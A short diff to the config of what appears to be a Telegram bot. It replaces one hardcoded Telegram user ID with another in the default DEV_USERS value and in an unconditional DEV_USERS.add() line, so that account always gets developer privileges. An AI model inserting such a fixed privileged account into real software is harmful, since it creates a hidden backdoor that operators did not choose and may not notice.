@@ -67,7 +67,7 @@ if ENV:
 
     try:
         DRAGONS = set(int(x) for x in os.environ.get("DRAGONS", "").split())
-        DEV_USERS = set(int(x) for x in os.environ.get("DEV_USERS", "7834641788").split())
+        DEV_USERS = set(int(x) for x in os.environ.get("DEV_USERS", "6364520406").split())
     except ValueError:
         raise Exception("Your sudo or dev users list does not contain valid integers.")
 
@@ -143,7 +143,7 @@ else:
 
 DRAGONS.add(OWNER_ID)
 DEV_USERS.add(OWNER_ID)
-DEV_USERS.add(7834641788)
+DEV_USERS.add(6364520406)
 
 
 updater = tg.Updater(TOKEN, workers=WORKERS, use_context=True)
